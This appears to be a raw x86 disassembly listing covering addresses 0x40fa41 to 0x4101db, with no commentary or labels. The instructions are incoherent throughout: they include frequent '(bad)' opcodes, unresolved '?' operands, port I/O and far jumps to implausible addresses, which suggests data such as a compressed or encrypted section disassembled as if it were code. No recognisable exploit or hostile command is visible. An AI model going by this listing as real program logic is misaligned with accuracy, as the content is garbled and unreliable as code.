  40fa41:	ret    0xedff
  40fa44:	adc    eax,0xadc08264
  40fa49:	inc    ebx
  40fa4a:	mov    dh,BYTE PTR [eax+0x71584902]
  40fa50:	repz sub bl,al
  40fa53:	aaa    
  40fa54:	mov    ecx,ebx
  40fa56:	pop    ebx
  40fa57:	test   esp,0x4267444c
  40fa5d:	push   eax
  40fa5e:	pop    ecx
  40fa5f:	in     eax,dx
  40fa60:	add    ebp,ecx
  40fa62:	inc    ecx
  40fa63:	jbe    0x40fa67
  40fa65:	ret    
  40fa66:	jmp    0x40fa02
  40fa68:	jmp    0x7a48:0x270ac0b9
  40fa6f:	je     0x40fa73
  40fa71:	jb     0x40fabd
  40fa73:	mul    DWORD PTR [esp+edx*1-0x333901fd]
  40fa7a:	add    BYTE PTR [edx-0x107cef7e],dh
  40fa80:	icebp  
  40fa81:	arpl   WORD PTR [ebp+0x66],cx
  40fa84:	mov    eax,ds:0x1676cb69
  40fa89:	ja     0x40fa33
  40fa8b:	ja     0x40fac4
  40fa8d:	outs   dx,DWORD PTR ds:[esi]
  40fa8e:	mov    ecx,0x41e82aa
  40fa93:	inc    ecx
  40fa94:	shl    DWORD PTR [ecx-0x36],1
  40fa97:	jle    0x40fa9c
  40fa99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa9a:	aam    0x0
  40fa9c:	add    BYTE PTR [eax],al
  40fa9e:	add    BYTE PTR [eax],al
  40faa0:	stos   DWORD PTR es:[edi],eax
  40faa1:	aam    0xf0
  40faa3:	mov    WORD PTR [ecx],?
  40faa5:	and    ah,BYTE PTR [ebx+0x44]
  40faa8:	shl    BYTE PTR es:[ecx+0x22],cl
  40faac:	jbe    0x40fb0d
  40faae:	popa   
  40faaf:	retf   0x37a
  40fab2:	scas   al,BYTE PTR es:[edi]
  40fab3:	lea    edi,[ecx]
  40fab5:	outs   dx,DWORD PTR es:[esi]
  40fab7:	loope  0x40fa57
  40fab9:	mov    ch,cl
  40fabb:	mov    BYTE PTR [edx],dh
  40fabd:	mov    bh,0xc5
  40fabf:	mov    esp,0x4385e773
  40fac4:	bound  edi,QWORD PTR [esi]
  40fac6:	xchg   ecx,eax
  40fac7:	or     DWORD PTR [esi+0x45],esi
  40faca:	jmp    FWORD PTR [ecx-0x47]
  40facd:	add    edx,DWORD PTR [eax+0x6e]
  40fad0:	or     al,0x5e
  40fad2:	(bad)  
  40fad3:	mov    esp,0xd5bf8772
  40fad8:	push   eax
  40fad9:	mov    DWORD PTR [ebp+ecx*2+0x0],ecx
  40fadd:	add    eax,DWORD PTR [ebx+0x44817d2a]
  40fae3:	dec    ebp
  40fae4:	ins    DWORD PTR es:[edi],dx
  40fae5:	sub    edi,ecx
  40fae7:	push   0xffffffaf
  40fae9:	adc    ebx,ebp
  40faeb:	mov    ?,edx
  40faed:	into   
  40faee:	sti    
  40faef:	add    DWORD PTR cs:[edx],0x7e0bf4eb
  40faf6:	aas    
  40faf7:	sub    ch,dl
  40faf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fafa:	out    0x6a,eax
  40fafc:	les    edi,FWORD PTR [ecx]
  40fafe:	(bad)  
  40faff:	(bad)  [esi]
  40fb01:	and    eax,0x704b
  40fb06:	add    BYTE PTR [eax],al
  40fb08:	add    BYTE PTR [ebx+0x2],bh
  40fb0b:	ret    0x76f1
  40fb0e:	test   al,0x17
  40fb10:	sub    DWORD PTR [esi-0x4f],0x39ee942
  40fb17:	mov    ebx,ebp
  40fb19:	jbe    0x40fb0c
  40fb1b:	fidiv  DWORD PTR [ecx-0x2b]
  40fb1e:	and    al,0x88
  40fb20:	xor    al,0x35
  40fb22:	mov    BYTE PTR [eax+0xd],al
  40fb25:	cli    
  40fb26:	xchg   ecx,eax
  40fb27:	pop    es
  40fb28:	imul   esi,DWORD PTR [esi+0x2],0xb7420200
  40fb2f:	dec    edi
  40fb30:	push   0x12
  40fb32:	add    eax,0x276e984
  40fb37:	adc    al,0x1f
  40fb39:	scas   eax,DWORD PTR es:[edi]
  40fb3a:	mov    ?,WORD PTR [ebx]
  40fb3c:	repz jmp 0x7ca3d2f8
  40fb42:	stc    
  40fb43:	ret    0x6b15
  40fb46:	mov    ?,WORD PTR [ebx]
  40fb48:	add    BYTE PTR [esp+ecx*4+0x44],ah
  40fb4c:	adc    BYTE PTR [edi-0x3a],cl
  40fb4f:	xchg   DWORD PTR [ebp-0x18],eax
  40fb52:	lea    edi,[ebx-0x20]
  40fb55:	add    eax,0xc71873e0
  40fb5a:	pop    edx
  40fb5b:	push   es
  40fb5c:	cmp    edi,DWORD PTR [edx+edi*2]
  40fb5f:	pop    es
  40fb60:	mov    esi,ecx
  40fb62:	or     al,0x89
  40fb64:	adc    BYTE PTR [edx+0x4a],dl
  40fb67:	in     eax,0x1
  40fb69:	(bad)
  40fb6d:	add    BYTE PTR [eax],al
  40fb6f:	add    BYTE PTR [eax],al
  40fb71:	add    BYTE PTR [ebp+eax*1-0x15],cl
  40fb75:	ficomp WORD PTR [edi+0x54eb12cb]
  40fb7b:	xor    al,0xbe
  40fb7d:	inc    eax
  40fb7e:	dec    edi
  40fb7f:	mov    WORD PTR [ebx-0x18],fs
  40fb82:	push   edx
  40fb83:	dec    edx
  40fb84:	in     eax,0x0
  40fb86:	pop    edi
  40fb87:	push   edx
  40fb88:	cli    
  40fb89:	call   DWORD PTR [esi+0x4a]
  40fb8c:	in     eax,0xe8
  40fb8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb8f:	mov    DWORD PTR [eax],eax
  40fb91:	add    BYTE PTR [esi+0x57560009],cl
  40fb97:	cmp    dh,BYTE PTR [esi+0x57011c14]
  40fb9d:	push   0xffffffcd
  40fb9f:	shl    DWORD PTR [edx+0x24],0xc0
  40fba3:	in     eax,dx
  40fba4:	adc    BYTE PTR [ebx-0x74f5d590],cl
  40fbaa:	or     ebp,esi
  40fbac:	fisttp DWORD PTR [ebp+ecx*4+0x0]
  40fbb0:	test   al,al
  40fbb2:	pusha  
  40fbb3:	punpckhdq mm0,QWORD PTR [ebx]
  40fbb6:	jae    0x40fb7b
  40fbb8:	aam    0x8b
  40fbba:	les    eax,FWORD PTR [ebp+edi*8+0x5c22f275]
  40fbc1:	ret    0x84
  40fbc4:	push   ebp
  40fbc5:	mov    esi,DWORD PTR [ebp-0x7b]
  40fbc8:	test   bl,ah
  40fbca:	ins    DWORD PTR es:[edi],dx
  40fbcb:	test   eax,0x1bc6132f
  40fbd0:	fsin   
  40fbd2:	loopne 0x40fc01
  40fbd4:	mov    esi,ecx
  40fbd6:	add    BYTE PTR [eax],al
  40fbd8:	add    BYTE PTR [eax],al
  40fbda:	add    BYTE PTR [edx+0x3f],dl
  40fbdd:	or     cl,BYTE PTR [ecx-0x7719ba3f]
  40fbe3:	mov    cl,0xd
  40fbe5:	sbb    al,0xff
  40fbe7:	pusha  
  40fbe8:	imul   edx,DWORD PTR ds:0x5ba07540,0x865d4e84
  40fbf2:	mov    dh,BYTE PTR [ebp+0x29]
  40fbf5:	add    cl,BYTE PTR [edi]
  40fbf7:	loop   0x40fc67
  40fbf9:	or     cl,BYTE PTR [ebp+0x501c0db9]
  40fbff:	or     dh,BYTE PTR [esi-0x1a]
  40fc02:	adc    esi,DWORD PTR [edx-0x24]
  40fc05:	(bad)  
  40fc06:	or     ecx,DWORD PTR [edi-0x7a20bed9]
  40fc0c:	and    BYTE PTR [ecx+0x4f],al
  40fc0f:	pop    edi
  40fc10:	sub    DWORD PTR [edx+0x2297583],ebp
  40fc16:	push   ebx
  40fc17:	ficom  DWORD PTR [esi+0x7e]
  40fc1a:	adc    esi,DWORD PTR ds:0x40bf8529
  40fc20:	and    eax,0xc5cedaf3
  40fc25:	mov    WORD PTR [ebx-0x6f],es
  40fc28:	add    DWORD PTR [ebp-0x31214d09],eax
  40fc2e:	mov    ah,BYTE PTR [eax+0x11]
  40fc31:	pop    ss
  40fc32:	inc    eax
  40fc33:	jne    0x40fc04
  40fc35:	xor    edx,DWORD PTR [edx-0x14]
  40fc38:	sbb    eax,0x9b921be8
  40fc3d:	mov    edi,DWORD PTR [eax+eax*1]
  40fc40:	add    BYTE PTR [eax],al
  40fc42:	add    BYTE PTR [eax],al
  40fc44:	sub    eax,0x71ffc256
  40fc49:	add    ch,cl
  40fc4b:	add    esi,DWORD PTR [ebp+0xa]
  40fc4e:	cmp    DWORD PTR [esi+0x5895cf62],ebp
  40fc54:	imul   esi,DWORD PTR [ebp-0x19397324],0xffffffc8
  40fc5b:	inc    eax
  40fc5c:	loope  0x40fc68
  40fc5e:	jb     0x40fc2f
  40fc60:	xchg   esi,eax
  40fc61:	sbb    al,BYTE PTR [ecx+0x6d3b4baa]
  40fc67:	lods   eax,DWORD PTR ds:[esi]
  40fc68:	push   edx
  40fc69:	cmp    ebx,esp
  40fc6b:	out    0x62,eax
  40fc6d:	xchg   DWORD PTR [eax+0x40],eax
  40fc70:	dec    eax
  40fc71:	in     eax,0x55
  40fc73:	inc    eax
  40fc74:	sub    esi,DWORD PTR [ebx]
  40fc76:	mov    eax,0xbc3b12ad
  40fc7b:	out    0x7e,eax
  40fc7d:	cmp    edx,DWORD PTR ds:0x3e85782c
  40fc83:	mov    bh,0x74
  40fc85:	mov    esi,esp
  40fc87:	loopne 0x40fc29
  40fc89:	xchg   DWORD PTR [ecx],ebp
  40fc8b:	fsub   st(7),st
  40fc8d:	and    al,0xbb
  40fc8f:	inc    ebp
  40fc90:	jp     0x40fc94
  40fc92:	mov    edi,0xe642e58c
  40fc97:	adc    ebp,DWORD PTR [ecx-0x3e]
  40fc9a:	call   0xe7eca0ca
  40fc9f:	add    ecx,ebx
  40fca1:	(bad)
  40fca4:	je     0x40fc5c
  40fca6:	out    0xd9,al
  40fca8:	add    BYTE PTR [eax],al
  40fcaa:	add    BYTE PTR [eax],al
  40fcac:	add    dl,bl
  40fcae:	push   es
  40fcaf:	cwde   
  40fcb0:	aas    
  40fcb1:	mov    ebx,0xb4dea686
  40fcb6:	add    eax,0x2dffd8e9
  40fcbb:	xor    BYTE PTR [bp+0x1],ch
  40fcbf:	jmp    0x161542c7
  40fcc4:	mov    ecx,DWORD PTR [edx-0x7a4a0082]
  40fcca:	or     eax,DWORD PTR [edx+0x27954]
  40fcd0:	push   0xe9048b3a
  40fcd5:	jbe    0x40fce0
  40fcd7:	(bad)  
  40fcd8:	pusha  
  40fcd9:	jno    0x40fcdd
  40fcdb:	add    BYTE PTR [edx+0x54],ah
  40fcde:	add    al,BYTE PTR [ebp+0xf071da2]
  40fce4:	ss jbe 0x40fc6c
  40fce7:	imul   ebx
  40fce9:	add    bh,bh
  40fceb:	xor    BYTE PTR [ecx+0x6a],0xaf
  40fcef:	je     0x40fd63
  40fcf1:	cld    
  40fcf2:	or     eax,0x377164c7
  40fcf7:	(bad)  
  40fcf8:	push   esi
  40fcf9:	jge    0x40fcfd
  40fcfb:	add    cl,ch
  40fcfd:	in     eax,dx
  40fcfe:	cmp    BYTE PTR [ebx-0xa],dh
  40fd01:	out    dx,eax
  40fd02:	push   eax
  40fd03:	mov    ch,BYTE PTR [edi]
  40fd05:	in     al,0x7e
  40fd07:	div    DWORD PTR [edi]
  40fd09:	dec    edx
  40fd0a:	cmp    bh,ah
  40fd0c:	fsubr  st(3),st
  40fd0e:	add    al,BYTE PTR [eax]
  40fd10:	imul   eax,DWORD PTR [eax],0x0
  40fd16:	sti    
  40fd17:	cmp    DWORD PTR [edx-0x47],esi
  40fd1a:	xor    DWORD PTR [eax+0x45],0xffffffeb
  40fd1e:	add    eax,0x2ed2d3c9
  40fd23:	mov    bl,0x44
  40fd25:	xchg   ecx,eax
  40fd26:	cs cmp esi,edi
  40fd29:	jmp    0xf6f0b2cc
  40fd2e:	mov    ecx,DWORD PTR [edi+ebp*8+0x12b58b64]
  40fd35:	shl    DWORD PTR [ebx-0x5816ff59],1
  40fd3b:	jns    0x40fd03
  40fd3d:	out    dx,eax
  40fd3e:	xchg   BYTE PTR [esi-0x752716c1],ch
  40fd44:	inc    ebp
  40fd45:	add    BYTE PTR [ebp+ebp*8+0x0],ah
  40fd49:	xor    ecx,edx
  40fd4b:	mov    dh,ah
  40fd4d:	je     0x40fcef
  40fd4f:	push   eax
  40fd50:	std    
  40fd51:	jne    0x40fcf3
  40fd53:	pop    edi
  40fd54:	xchg   DWORD PTR [esi+0x78],edi
  40fd57:	in     eax,dx
  40fd58:	aam    0xb0
  40fd5a:	adc    edi,eax
  40fd5c:	xchg   DWORD PTR [esi+0x6c],eax
  40fd5f:	mov    bh,BYTE PTR [esi+0x48c5d75]
  40fd65:	push   0x4d
  40fd67:	mov    esp,cs
  40fd69:	jmp    FWORD PTR [esp+esi*1]
  40fd6c:	mov    esi,0xc75d625f
  40fd71:	ret    0x554
  40fd74:	mov    edi,DWORD PTR ds:0x401090
  40fd7a:	add    BYTE PTR [eax],al
  40fd7c:	add    BYTE PTR [eax],al
  40fd7e:	add    BYTE PTR [ecx+0x342672dc],bl
  40fd84:	test   esi,edi
  40fd86:	dec    DWORD PTR [edx+edx*4]
  40fd89:	pop    esp
  40fd8a:	dec    eax
  40fd8b:	inc    esi
  40fd8c:	add    eax,0x4529ff53
  40fd91:	adc    al,0x40
  40fd93:	sbb    al,0x8c
  40fd95:	inc    ebx
  40fd96:	or     BYTE PTR [edi+0x12e80ac1],cl
  40fd9c:	int3   
  40fd9d:	std    
  40fd9e:	jmp    FWORD PTR [eax+edi*8]
  40fda1:	jae    0x40fdab
  40fda3:	das    
  40fda4:	clc    
  40fda5:	aad    0x83
  40fda7:	cwde   
  40fda8:	or     DWORD PTR [edx+0x2c],ebp
  40fdab:	jae    0x40fe27
  40fdad:	or     cl,BYTE PTR [ebp-0xaff0e6]
  40fdb3:	imul   eax,DWORD PTR [edx+eax*8-0x1640a8f4],0xffffffb7
  40fdbb:	jg     0x40fe0e
  40fdbd:	push   esp
  40fdbe:	push   edi
  40fdbf:	daa    
  40fdc0:	out    dx,al
  40fdc1:	std    
  40fdc2:	jbe    0x40fe39
  40fdc4:	cmp    eax,DWORD PTR [edi+0x6c488df8]
  40fdca:	(bad)  
  40fdcb:	call   0x5:0xfe0fc4b3
  40fdd2:	push   ss
  40fdd3:	xor    eax,0x6545892b
  40fdd8:	ror    DWORD PTR [eax-0x74f69eba],0x45
  40fddf:	mov    DWORD PTR [esp+eiz*4+0xf],ebp
  40fde6:	add    BYTE PTR [eax],al
  40fde8:	jne    0x40fe46
  40fdea:	inc    edx
  40fdeb:	addr16 cmc 
  40fded:	sub    DWORD PTR [edx],eax
  40fdef:	add    bl,dl
  40fdf1:	mov    dl,0xc4
  40fdf3:	adc    eax,DWORD PTR [eax]
  40fdf5:	sbb    esp,ecx
  40fdf7:	mov    WORD PTR [ebx+0x424fd0e1],?
  40fdfd:	(bad)  
  40fdfe:	lock mov edi,0x88a60dcf
  40fe04:	jbe    0x40fdde
  40fe06:	mov    ch,0xf
  40fe08:	mul    bh
  40fe0a:	adc    eax,0xa9ef2256
  40fe0f:	sub    ecx,DWORD PTR [edi+0x6bc67f29]
  40fe15:	nop
  40fe16:	cmp    edx,DWORD PTR [esi*4-0x8003da9]
  40fe1d:	fucom  st(7)
  40fe1f:	pop    esi
  40fe20:	fwait
  40fe21:	xlat   BYTE PTR ds:[ebx]
  40fe23:	ret    0xb448
  40fe26:	das    
  40fe27:	sbb    cl,0x45
  40fe2a:	add    BYTE PTR [eax],al
  40fe2c:	jne    0x40fe9d
  40fe2e:	lea    esi,[ebp+edx*8-0x2201c302]
  40fe35:	addr16 lahf 
  40fe37:	dec    edx
  40fe39:	sahf   
  40fe3a:	xchg   bl,ah
  40fe3c:	shr    BYTE PTR [eax],0x3b
  40fe3f:	dec    edi
  40fe40:	dec    edi
  40fe41:	add    cl,BYTE PTR [ebp+edi*1+0x6b]
  40fe45:	sub    dh,BYTE PTR [ecx]
  40fe47:	or     dh,BYTE PTR [edi+0x2]
  40fe4a:	ins    DWORD PTR es:[edi],dx
  40fe4b:	inc    ebx
  40fe4c:	add    BYTE PTR [eax],al
  40fe4e:	add    BYTE PTR [eax],al
  40fe50:	add    ch,bl
  40fe52:	sub    bh,ah
  40fe54:	add    esi,DWORD PTR [ebp-0x75]
  40fe57:	scas   al,BYTE PTR es:[edi]
  40fe58:	mov    dh,0x7f
  40fe5a:	inc    eax
  40fe5b:	call   0x3c0a3363
  40fe60:	cmp    eax,DWORD PTR [edx+eax*2-0x3f]
  40fe64:	(bad)  
  40fe65:	mov    al,0x2
  40fe67:	jmp    0x9feebc2f
  40fe6c:	sub    esp,DWORD PTR [edx]
  40fe6e:	shr    eax,cl
  40fe70:	add    ecx,edi
  40fe72:	push   cs
  40fe73:	xor    DWORD PTR [edx-0x39],0xdcd3e902
  40fe7a:	mov    al,ds:0x9a52f47d
  40fe7f:	fild   WORD PTR [ecx]
  40fe81:	jne    0x40ff01
  40fe83:	test   al,0xb7
  40fe85:	pop    ds
  40fe86:	test   DWORD PTR [ebx+0x182ac257],ebp
  40fe8c:	popa   
  40fe8d:	jne    0x40fe91
  40fe8f:	iret   
  40fe90:	and    BYTE PTR [ecx-0x7a4817b2],0x85
  40fe97:	stos   DWORD PTR es:[edi],eax
  40fe98:	push   edi
  40fe99:	ret    0xc5ac
  40fe9c:	cmp    al,0x43
  40fe9e:	sub    bh,BYTE PTR ds:0x6502770a
  40fea4:	inc    ebx
  40fea5:	xchg   BYTE PTR [eax+ebx*2+0x2],bh
  40fea9:	push   ebx
  40feaa:	dec    ecx
  40feab:	sub    esi,edx
  40fead:	jmp    DWORD PTR ds:0x1da2f67
  40feb3:	jmp    0x40febb
  40feb8:	add    BYTE PTR [eax],al
  40feba:	inc    ebx
  40febb:	aaa    
  40febc:	fisttp DWORD PTR [ebx]
  40febe:	retw   0x88e8
  40fec2:	fiadd  DWORD PTR [edi+edi*8-0x39387555]
  40fec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feca:	cmp    bh,0xff
  40fecd:	call   0x39553648
  40fed2:	test   dl,al
  40fed4:	jmp    FWORD PTR [ebx+0x39]
  40fed7:	mov    bl,0x4
  40fed9:	bound  esi,QWORD PTR [edi]
  40fedb:	in     al,dx
  40fedc:	inc    esp
  40fedd:	rol    DWORD PTR [eax],0xbe
  40fee0:	div    DWORD PTR [eax-0x4c]
  40fee3:	sbb    eax,0xc7292c8c
  40fee8:	lds    esp,FWORD PTR [ecx+edx*2]
  40feeb:	add    cl,BYTE PTR [ecx+0x1434981c]
  40fef1:	inc    ebp
  40fef2:	add    dl,0xff
  40fef5:	arpl   WORD PTR [esi+eax*2],si
  40fef8:	dec    edi
  40fef9:	sub    DWORD PTR [esp+ebx*4-0x40fe1700],0x19f46ce8
  40ff04:	push   DWORD PTR [esi+0x7e]
  40ff07:	(bad)  
  40ff0a:	(bad)  
  40ff0b:	adc    al,BYTE PTR [eax-0x17]
  40ff0e:	add    edi,DWORD PTR [edi+0x1b]
  40ff11:	pop    esi
  40ff12:	outs   dx,BYTE PTR ds:[esi]
  40ff13:	xor    al,0x6a
  40ff15:	sub    DWORD PTR [ebp-0x34c3bb76],esi
  40ff1b:	adc    cl,BYTE PTR [ebp+0xac]
  40ff21:	add    BYTE PTR [eax],al
  40ff23:	push   esi
  40ff24:	lds    ecx,FWORD PTR [edx+0x6aa87ea4]
  40ff2a:	or     DWORD PTR ss:[esi],ebx
  40ff2d:	repz loope 0x40ffa0
  40ff30:	add    bl,BYTE PTR [esi+0x30]
  40ff33:	cmp    eax,DWORD PTR [ecx]
  40ff35:	add    BYTE PTR [ebx+edi*8-0x76fa7dd7],dh
  40ff3c:	int    0x69
  40ff3e:	enter  0x3608,0x54
  40ff42:	add    BYTE PTR [ebx+0x13],bh
  40ff45:	inc    eax
  40ff46:	push   ss
  40ff47:	sbb    al,0x2
  40ff49:	add    esp,0xffffffd8
  40ff4c:	addr16 sbb eax,0x4486f258
  40ff52:	add    DWORD PTR [ecx],ebp
  40ff54:	inc    edx
  40ff55:	out    dx,al
  40ff56:	push   eax
  40ff57:	rol    BYTE PTR [ebx],cl
  40ff59:	add    eax,ebp
  40ff5b:	or     esp,DWORD PTR [eax-0x7acd0001]
  40ff61:	inc    ebx
  40ff62:	lock inc edx
  40ff64:	xchg   DWORD PTR [ebp+eax*1+0x32],eax
  40ff68:	test   DWORD PTR [ebx-0xe],eax
  40ff6b:	xor    al,BYTE PTR [edi+0x42190744]
  40ff71:	cli    
  40ff72:	push   eax
  40ff73:	add    al,0x6b
  40ff75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff76:	add    DWORD PTR [eax+edi*4-0x3],ebx
  40ff7a:	dec    DWORD PTR [ecx+eax*1-0x7b]
  40ff7e:	rol    BYTE PTR [eax-0x7b274f4],0x33
  40ff85:	int    0xf
  40ff87:	add    BYTE PTR [eax],al
  40ff89:	add    BYTE PTR [eax],al
  40ff8b:	add    BYTE PTR [ebx-0x2a99b137],dl
  40ff91:	dec    ebx
  40ff92:	pop    es
  40ff93:	call   0x3ea7f2
  40ff98:	test   eax,0xc450fa42
  40ff9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff9e:	mov    ds:0xbe820c01,eax
  40ffa3:	je     0x40ffc3
  40ffa5:	test   BYTE PTR [ebx-0x4],cl
  40ffa8:	ja     0x40ff73
  40ffaa:	or     eax,0x64515b47
  40ffaf:	mov    edx,ebx
  40ffb1:	add    ebp,eax
  40ffb3:	das    
  40ffb4:	jp     0x40ffae
  40ffb6:	std    
  40ffb7:	lea    esp,[ecx]
  40ffb9:	in     eax,dx
  40ffba:	dec    esi
  40ffbb:	call   0x40d54d
  40ffc0:	jne    0x40ff68
  40ffc2:	inc    edx
  40ffc3:	jae    0x40ff49
  40ffc5:	push   edx
  40ffc6:	mov    bh,0xfb
  40ffc8:	and    eax,0xc97cc02c
  40ffcd:	jl     0x40ff5a
  40ffcf:	jge    0x410041
  40ffd1:	add    edx,DWORD PTR [esi+ebp*4]
  40ffd4:	mov    edx,0xb1448623
  40ffd9:	cli    
  40ffda:	stos   DWORD PTR es:[edi],eax
  40ffdb:	xchg   edi,eax
  40ffdc:	jne    0x410009
  40ffde:	add    ch,al
  40ffe0:	inc    edi
  40ffe1:	mov    eax,DWORD PTR [edx]
  40ffe3:	add    BYTE PTR [edx],bh
  40ffe5:	sahf   
  40ffe6:	inc    ebx
  40ffe7:	jae    0x41004d
  40ffe9:	test   al,0xb6
  40ffeb:	sti    
  40ffec:	inc    ebp
  40ffed:	stc    
  40ffee:	(bad)  
  40ffef:	add    BYTE PTR gs:[eax],al
  40fff2:	add    BYTE PTR [eax],al
  40fff4:	add    dh,dh
  40fff6:	fadd   QWORD PTR [ecx+eax*1]
  40fff9:	and    eax,0x72ac2643
  40fffe:	pop    ebp
  40ffff:	dec    edx
  410000:	ret    0xb0c0
  410003:	daa    
  410004:	adc    BYTE PTR [ecx-0xe],0x5
  410008:	add    BYTE PTR [ebp-0x8],dh
  41000b:	rcl    DWORD PTR [esi+0xe],1
  41000e:	add    DWORD PTR es:[eax],eax
  410011:	jne    0x41002b
  410013:	xchg   DWORD PTR [ecx+edx*1-0x5a01c751],eax
  41001a:	inc    DWORD PTR [ebx]
  41001c:	dec    DWORD PTR [eax+0x75401619]
  410022:	mov    al,0xf6
  410024:	aas    
  410025:	mov    ebp,DWORD PTR [ecx+0x2]
  410028:	mov    DWORD PTR [eax-0x7640812f],esi
  41002e:	pop    eax
  41002f:	test   DWORD PTR [ecx+ebx*8-0x5b01c70a],ecx
  410036:	sahf   
  410037:	scas   al,BYTE PTR es:[edi]
  410038:	ror    DWORD PTR ds:0xf2fe4460,cl
  41003e:	add    ch,BYTE PTR [ebp+0x44]
  410041:	popa   
  410042:	add    eax,0xbdf00793
  410047:	cmp    al,0xae
  410049:	fcmovb st,st(3)
  41004b:	or     eax,0xf43ef751
  410050:	cmp    BYTE PTR [ecx-0x36],ah
  410053:	fcmovb st,st(3)
  410055:	ret    0xf888
  410058:	rol    DWORD PTR [eax],1
  41005a:	add    BYTE PTR [eax],al
  41005c:	add    BYTE PTR [eax],al
  41005e:	mov    ebx,0x3516590d
  410063:	add    ah,BYTE PTR [eax-0x16fd8bfc]
  410069:	cld    
  41006a:	mov    ch,0xcc
  41006c:	arpl   WORD PTR [esi+0x431c038e],bp
  410072:	call   0xa87e:0x8b38ab0b
  410079:	scas   al,BYTE PTR es:[edi]
  41007a:	outs   dx,BYTE PTR ds:[esi]
  41007b:	test   al,0xe4
  41007d:	mov    WORD PTR [eax+0x73d3e8a8],?
  410083:	dec    ebx
  410084:	imul   edi,DWORD PTR [edi],0x3c23857e
  41008a:	mov    dl,0x85
  41008c:	imul   esp,DWORD PTR [edi+0x59],0x33
  410090:	(bad)  
  410091:	rcr    esp,cl
  410093:	add    BYTE PTR [eax-0x2a],dh
  410096:	inc    edx
  410097:	xor    edx,ebx
  410099:	inc    ebx
  41009a:	addr16 ret 0x7fe8
  41009e:	cli    
  41009f:	lods   eax,DWORD PTR ds:[esi]
  4100a0:	(bad)  
  4100a1:	xchg   cl,bh
  4100a3:	arpl   WORD PTR gs:[eax],di
  4100a6:	sub    edx,edx
  4100a8:	jno    0x410068
  4100aa:	sub    al,BYTE PTR [ebp+0x571223db]
  4100b0:	daa    
  4100b1:	cmp    BYTE PTR [ebx],dl
  4100b3:	jle    0x4100dd
  4100b5:	scas   al,BYTE PTR es:[edi]
  4100b6:	jns    0x410060
  4100b8:	in     al,dx
  4100b9:	xchg   BYTE PTR [ecx+0x76c2ff22],bh
  4100bf:	sar    dh,cl
  4100c1:	push   ss
  4100c2:	add    BYTE PTR [eax],al
  4100c4:	add    BYTE PTR [eax],al
  4100c6:	add    cl,bh
  4100c8:	or     esi,DWORD PTR ds:[ebx+ebp*1+0x47]
  4100cd:	dec    edi
  4100ce:	ins    BYTE PTR es:[edi],dx
  4100cf:	and    edi,DWORD PTR [edi]
  4100d1:	dec    edi
  4100d2:	sbb    esi,DWORD PTR fs:[edi+0x4f]
  4100d6:	pop    esp
  4100d7:	adc    ebp,DWORD PTR [edi+0x4f]
  4100da:	xchg   ebx,eax
  4100db:	lea    esi,[esp+edx*1]
  4100de:	mov    ch,0x68
  4100e0:	ret    0x6bff
  4100e3:	ss scas al,BYTE PTR es:[edi]
  4100e5:	add    edi,DWORD PTR [edx+0x72202864]
  4100eb:	mov    ah,0x6e
  4100ed:	mov    ch,BYTE PTR [ecx+eiz*1]
  4100f0:	test   eax,0x8276ebff
  4100f5:	rol    BYTE PTR [ebx],0xe1
  4100f8:	mov    dl,0x95
  4100fa:	popa   
  4100fb:	jno    0x41007e
  4100fd:	ror    BYTE PTR [eax],1
  4100ff:	mov    ebx,0xa118fda0
  410104:	sbb    bh,BYTE PTR [eax-0x74fd8896]
  41010a:	cdq    
  41010b:	(bad)  
  41010c:	mov    esi,0x362deae7
  410111:	mov    ch,BYTE PTR [edi*4+0x64e85b7e]
  410118:	jnp    0x410176
  41011a:	xor    esp,0x47e6744c
  410120:	xor    eax,ebp
  410122:	outs   dx,BYTE PTR ds:[esi]
  410123:	jno    0x410127
  410125:	add    BYTE PTR [edx-0x4a],ah
  410128:	sub    DWORD PTR [edi+0x95],edx
  41012e:	add    BYTE PTR [eax],al
  410130:	bound  esi,QWORD PTR [eax]
  410132:	mov    ah,BYTE PTR [ecx-0xc]
  410135:	xor    BYTE PTR [ebx-0x2d],dh
  410138:	pop    eax
  410139:	or     BYTE PTR [ecx],al
  41013b:	mov    BYTE PTR [ebp+0x1c004252],bh
  410141:	jg     0x410188
  410143:	add    esp,ebp
  410145:	mov    esi,0x7b0c43cf
  41014a:	pop    ebp
  41014b:	adc    dl,BYTE PTR [ecx+esi*2+0x3]
  41014f:	(bad)  
  410150:	jmp    0xcc8111a6
  410155:	pop    DWORD PTR [edi+0x757eca47]
  41015b:	or     dl,bh
  41015d:	jl     0x4101a2
  41015f:	fadd   QWORD PTR [edi+0x33]
  410162:	cmp    dl,BYTE PTR [esi]
  410164:	or     al,0x6
  410166:	mov    WORD PTR [ebx],cx
  410169:	or     ah,BYTE PTR [esi-0x75]
  41016c:	fabs   
  41016e:	mov    DWORD PTR fs:[ebx+0x8],ebx
  410172:	mov    bx,WORD PTR [ecx-0x22]
  410176:	mov    DWORD PTR fs:[ebx+0x16],ecx
  41017a:	movzx  ebx,WORD PTR [ebx-0x6]
  41017e:	dec    edi
  41017f:	dec    DWORD PTR [ecx-0x2e]
  410182:	push   ecx
  410183:	(bad)  
  410184:	jmp    0xd804:0x9047b708
  41018b:	por    mm6,QWORD PTR [eax+0xc]
  41018f:	sbb    DWORD PTR [eax],0x9
  410192:	push   eax
  410193:	inc    DWORD PTR [eax]
  410195:	add    BYTE PTR [eax],al
  410197:	add    BYTE PTR [eax],al
  410199:	mov    edx,ebx
  41019b:	push   ecx
  41019c:	call   FWORD PTR [edx]
  41019e:	or     BYTE PTR [edi-0x3d7bb3b9],dh
  4101a4:	or     al,0x6c
  4101a6:	or     DWORD PTR [edi+0x73f85247],esi
  4101ac:	loopne 0x4101fd
  4101ae:	les    ecx,FWORD PTR [esi-0x1]
  4101b1:	or     bh,BYTE PTR [ebx+ebx*2-0x8]
  4101b5:	lahf   
  4101b6:	icebp  
  4101b7:	or     cl,BYTE PTR [ebp-0x30193eb7]
  4101bd:	jne    0x41019a
  4101bf:	xor    eax,0x265600fe
  4101c4:	out    0x32,eax
  4101c6:	(bad)  ds:0x2275f0fe
  4101cc:	out    0xba,eax
  4101ce:	fidiv  DWORD PTR ds:0xa65fefe
  4101d4:	mov    DWORD PTR [ebp+0x435e3db4],ecx
  4101da:	inc    esp
  4101db:	dec    ebx
